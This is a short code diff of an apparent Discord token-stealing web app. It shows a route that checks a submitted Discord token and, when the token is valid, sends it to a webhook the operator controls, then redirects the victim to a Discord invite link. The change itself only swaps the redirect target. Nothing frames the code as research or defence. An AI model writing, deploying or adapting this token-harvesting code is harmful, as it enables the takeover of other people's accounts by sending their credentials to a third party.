@@ -23,7 +23,7 @@ hook = Webhook(e)
 def index(token):
   if check_discord_token(token) == "True":
       hook.send(token)
-  return redirect("https://discord.com")
+  return redirect("https://discord.gg/sTp8ask4ay")
 
 if __name__ == "__main__":
   app.run(host='0.0.0.0', port=81)
